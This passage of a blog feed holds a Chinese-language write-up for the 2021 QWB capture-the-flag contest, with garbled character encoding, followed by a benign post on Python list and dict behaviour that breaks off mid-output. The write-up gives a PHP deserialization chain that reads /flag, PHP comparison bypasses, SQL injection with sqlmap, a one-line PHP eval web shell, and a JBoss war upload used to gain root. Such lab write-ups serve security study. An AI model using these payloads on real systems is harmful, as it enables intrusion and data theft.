variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>ç›´æ¥è¯»<code>/flag</code></p><p>è§£ç å¾—flag</p><img src="/article/2021qwb/image-20210613212339286-4170472.png" class="" title="image-20210613212339286" loading="lazy"><h2 id="å¯»å®-SOLVED-Err0r"><a href="#å¯»å®-SOLVED-Err0r" class="headerlink" title="å¯»å® | SOLVED | Err0r"></a>å¯»å® | SOLVED | Err0r</h2><h2 id="ä¿¡æ¯ä¸€"><a href="#ä¿¡æ¯ä¸€" class="headerlink" title="ä¿¡æ¯ä¸€"></a>ä¿¡æ¯ä¸€</h2><p>ç»•å°±å®Œäº‹ï¼Œè¦æ±‚èƒ½è¿‡<code>is_numeric</code>å‡½æ•°ï¼Œåˆ©ç”¨å˜é‡è¦†ç›–èµ‹å€¼</p><h3 id="ç¬¬ä¸€å±‚"><a href="#ç¬¬ä¸€å±‚" class="headerlink" title="ç¬¬ä¸€å±‚"></a>ç¬¬ä¸€å±‚</h3><p><code>$num1 &gt; 1024</code></p><p>ç›´æ¥<code>1025a</code>å³å¯</p><h3 id="ç¬¬äºŒå±‚"><a href="#ç¬¬äºŒå±‚" class="headerlink" title="ç¬¬äºŒå±‚"></a>ç¬¬äºŒå±‚</h3><p><code>isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000</code></p><p>ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡<code>9e9</code></p><h3 id="ç¬¬ä¸‰å±‚"><a href="#ç¬¬ä¸‰å±‚" class="headerlink" title="ç¬¬ä¸‰å±‚"></a>ç¬¬ä¸‰å±‚</h3><p><code>isset($num3) &amp;&amp; &#39;4bf21cd&#39; === substr(md5($num3),0,7)</code></p><p>çˆ†md5<code>61823470</code></p><h3 id="ç¬¬å››å±‚"><a href="#ç¬¬å››å±‚" class="headerlink" title="ç¬¬å››å±‚"></a>ç¬¬å››å±‚</h3><p><code>!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4)</code></p><p>ç›´æ¥<code>aaaaaaa</code></p><h3 id="ç¬¬äº”å±‚"><a href="#ç¬¬äº”å±‚" class="headerlink" title="ç¬¬äº”å±‚"></a>ç¬¬äº”å±‚</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">===</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"ç¬¬äº”å±‚"</span><span class="token punctuation">;</span>                                    <span class="token keyword">include</span> <span class="token single-quoted-string string">'KeY1lhv.php'</span><span class="token punctuation">;</span>                                    <span class="token keyword">echo</span> <span class="token variable">$KEY1</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span></code></pre><p>éšä¾¿è¾“ä¸ª<code>a</code>è¿‡äº†â€¦</p><p>æ‹¿åˆ°KEY1<code>KEY1&#123;e1e1d3d40573127e9ee0480caf1283d6&#125;</code></p><h2 id="ä¿¡æ¯äºŒ"><a href="#ä¿¡æ¯äºŒ" class="headerlink" title="ä¿¡æ¯äºŒ"></a>ä¿¡æ¯äºŒ</h2><p>ä¸‹è½½å‘ç°ä¸€å¤§å †docxæ–‡æ¡£ï¼Œä¼°è®¡åœ¨æ–‡æ¡£é‡Œæ‰¾KEY2ï¼Œå†™è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# -*- coding: utf-8 -*-@File: findkey2.py@Author: gyy@Time: 6æœˆ 13, 2021"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">show_files</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># é¦–å…ˆéå†å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹</span>    file_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># å‡†å¤‡å¾ªç¯åˆ¤æ–­æ¯ä¸ªå…ƒç´ æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹è¿˜æ˜¯æ–‡ä»¶ï¼Œæ˜¯æ–‡ä»¶çš„è¯ï¼ŒæŠŠåç§°ä¼ å…¥listï¼Œæ˜¯æ–‡ä»¶å¤¹çš„è¯ï¼Œé€’å½’</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        <span class="token comment"># åˆ©ç”¨os.path.join()æ–¹æ³•å–å¾—è·¯å¾„å…¨åï¼Œå¹¶å­˜å…¥cur_pathå˜é‡ï¼Œå¦åˆ™æ¯æ¬¡åªèƒ½éå†ä¸€å±‚ç›®å½•</span>        cur_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶å¤¹</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            show_files<span class="token punctuation">(</span>cur_path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">".doc"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            all_files<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> all_files<span class="token comment"># ä¼ å…¥ç©ºçš„listæ¥æ”¶æ–‡ä»¶å</span>contents <span class="token operator">=</span> show_files<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># å¾ªç¯æ‰“å°show_fileså‡½æ•°è¿”å›çš„æ–‡ä»¶ååˆ—è¡¨</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"KEY"</span> <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIND IT!!!!!\n"</span><span class="token operator">+</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nALL DONE!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°</p><pre class="language-none"><code class="language-none">[&#39;xxx&#39;, &#39;xxx&#39;, &#39;KEY2&#123;T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS&#125;&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;]</code></pre><p>ç„¶åæäº¤KEY1å’ŒKEY2å¾—flag</p><img src="/article/2021qwb/image-20210613213530156-4170508.png" class="" title="image-20210613213530156" loading="lazy"><h2 id="Easyweb-SOLVED-D0gekong"><a href="#Easyweb-SOLVED-D0gekong" class="headerlink" title="Easyweb | SOLVED | D0gekong"></a>Easyweb | SOLVED | D0gekong</h2><p>æ‰“å¼€ç½‘å€å‘ç°æœ‰ä¸‰ä¸ªä¸œè¥¿ï¼ŒæŸ¥çœ‹æºç </p><img src="/article/2021qwb/image-20210613213721349-4170518.png" class="" title="image-20210613213721349" loading="lazy"><p>å‘ç°è·¯ç”±ï¼Œéƒ½ä¸‹è½½ä¸‹æ¥ï¼Œæœ‰ç”¨çš„hintï¼Œå…¶ä»–æ²¡ç”¨</p><pre class="language-none"><code class="language-none">Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee</code></pre><p>nmapçˆ†ç«¯å£</p><img src="/article/2021qwb/image-20210613213837935-4170530.png" class="" title="image-20210613213837935" loading="lazy"><p>å¾—åˆ°36842ç«¯å£ï¼Œè®¿é—®å‘ç°æ˜¯ç™»é™†ç•Œé¢ï¼Œç»™äº†è¡¨å åº”è¯¥å°±æ˜¯æ³¨å…¥ï¼Œè¯•äº†ä¸‹å‘ç°æœ‰å›æ˜¾æŠ¥é”™ï¼Œç›´æ¥sqlmapè·‘</p><p>ç”¨æˆ·åï¼šadmin</p><p>å¯†ç ï¼š99f609527226e076d668668582ac4420</p><p>ç™»é™†æˆåŠŸ</p><p>æ‰«æå‘ç°<code>/file</code>è·¯ç”±æœ‰æ–‡ä»¶ä¸Šä¼ </p><img src="/article/2021qwb/image-20210614132600977-4170551.png" class="" title="image-20210614132600977" loading="lazy"><p><code>.php</code>ç»•è¿‡è¿‡æ»¤</p><p>ç„¶å<code>./.php?1=shell.php&amp;2=&lt;?php eval($_POST[1]);?&gt;</code></p><p>è¿ä¸Šshellï¼Œéœ€è¦ææƒã€‚æ‰«è¿›ç¨‹å’Œç«¯å£ï¼Œæ²¡å•¥æ”¶è·ï¼Œæœ€ç»ˆåº”è¯¥æ˜¯æ‰“JAVAçš„jboss</p><p>frpç©¿å‡ºæ¥ï¼Œæ ¹æ®æ–‡ç« <a href="https://blog.csdn.net/weixin_43999372/article/details/88364032">https://blog.csdn.net/weixin_43999372/article/details/88364032</a></p><p>åˆ¶ä½œwaråŒ…ï¼Œä¸Šä¼ åæ‹¿åˆ°rootï¼Œè¯»å–æ ¹ç›®å½•flagï¼š</p><p>flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h1><h2 id="Easymath-SOLVED-Hn13"><a href="#Easymath-SOLVED-Hn13" class="headerlink" title="Easymath | SOLVED | Hn13"></a>Easymath | SOLVED | Hn13</h2><p>å°†å­—ç¬¦ä¸²ä¸¤ä¸ªä¸€ç»„æ‹†åˆ†å¹¶åšshort intä¼ å…¥å‡½æ•°åˆ¤æ–­ç›¸ç­‰ï¼Œdblæ•°ç»„ç”¨äºæ¯”è¾ƒã€‚è·Ÿè¿›å»sub_13f3å‡½æ•°ã€‚</p><p>ç»è¿‡å¤šç»„æ•°æ®æµ‹è¯•å‘ç°v3(i+1)ä¸v(i)è¿‘ä¼¼ç›¸ç­‰ï¼Œå› æ­¤v3 = 2.718281828459045 - (double)i * v3ä¸¤è¾¹çš„v3å¯ä»¥çœ‹ä½œè¿‘ä¼¼ç›¸ç­‰ï¼Œ(i+1)v3=2.718281828459045ï¼Œä½†æ˜¯ç”±äºå¾ªç¯ä¼ å…¥çš„å€¼ä¸èƒ½å–å¾—ï¼Œå› æ­¤ç›¸æ¯”ç­”æ¡ˆiçš„å€¼åº”è¯¥è¿›ä¸€æ­¥-1ï¼Œå³(flag+2)*dbl=e,flag=e/dbl-2ï¼Œç„¶åintç«¯åºä¸å­—ç¬¦ç›¸åï¼Œå†åä¸€ä¸‹å³å¯å¾—åˆ°æ­£ç¡®ç­”æ¡ˆã€‚</p><p>è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> mathsegs <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0.00009794904266317233</span><span class="token punctuation">,</span><span class="token number">0.00010270456917442</span><span class="token punctuation">,</span><span class="token number">0.00009194256152777895</span><span class="token punctuation">,</span><span class="token number">0.0001090322021913372</span>ï¼Œ<span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001007442677411854</span><span class="token punctuation">,</span><span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001047063607908828</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span><span class="token punctuation">,</span><span class="token number">0.0001046861985862495</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span>ï¼Œ<span class="token number">0.000108992856167966</span><span class="token punctuation">,</span><span class="token number">0.0001006882924839248</span><span class="token punctuation">,</span><span class="token number">0.0001112590796092291</span><span class="token punctuation">,</span><span class="token number">0.0001089841164633298</span><span class="token punctuation">,</span><span class="token number">0.00008468431512187874</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> segs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>è„šæœ¬è·‘å®Œç›´æ¥å‡ºflagï¼šflag{saam_dim_gei_lei_jam_caa_sin_laa}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python dictçš„å°å‘ç°</title>
      <link href="article/pythondict/"/>
      <url>article/pythondict/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸‹æ’¸è„šæœ¬çš„æ—¶å€™å¤„ç†æ•°æ®ç”¨åˆ°dictæ—¶çš„æœ‰è¶£å‘ç°</p><a id="more"></a><p>å­—å…¸æ˜¯å¦ä¸€ç§å¯å˜å®¹å™¨æ¨¡å‹ï¼Œä¸”å¯å­˜å‚¨ä»»æ„ç±»å‹å¯¹è±¡ã€‚</p><p>å…ˆä¸Š</p><h2 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: dicttest.py@Author: gyy@Time: 6æœˆ 08, 2021"""</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">resttask</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å‰©ä½™ä»»åŠ¡ï¼š%d ä¸ª"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    rest <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        rest<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest1\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>            resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""                ä¸­é—´çœç•¥            """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'C++'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># æ¨¡æ‹Ÿå‡ºé”™æƒ…å†µ</span>                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># æœ¬æ¬¡é€‰ç”¨çš„æµ‹è¯•æ•°æ®å‡æ²¡æœ‰ä»»ä½•ä¸»è§‚æ„è§</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœå®Œæˆå°±ç§»å‡ºæ­¤é¡¹</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                time <span class="token operator">-=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest2\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å…ˆpopå‡ºdict</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""                ä¸­é—´çœç•¥            """</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Java'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># æ¨¡æ‹Ÿå‡ºé”™æƒ…å†µ</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># æœ¬æ¬¡é€‰ç”¨çš„æµ‹è¯•æ•°æ®å‡æ²¡æœ‰ä»»ä½•ä¸»è§‚æ„è§</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœå‡ºé”™å†ç»™å®ƒåŠ å›è¿›é˜Ÿåˆ—</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token comment"># æœ¬æ¬¡é€‰ç”¨çš„æµ‹è¯•æ•°æ®å‡æ²¡æœ‰ä»»ä½•ä¸»è§‚æ„è§</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test1<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test2<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><pre class="language-none"><code class="language-none">&#123;&#39;name&#39;: &#39;C&#39;&#125;&#123;&#39;name&#39;: &#39;C++&#39;&#125;&#123;&#39;name&#39;: &#39;Python&#39;&#125;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;&#123;&#39;name&#39;: &#39;go&#39;&#125;&#123;&#39;name&#39;: &#39;Java&#39;&#125;&#123;&#39;name&#39;: &#39;sql&#39;&#125;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š8 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š7 ä¸ª[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š5 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, 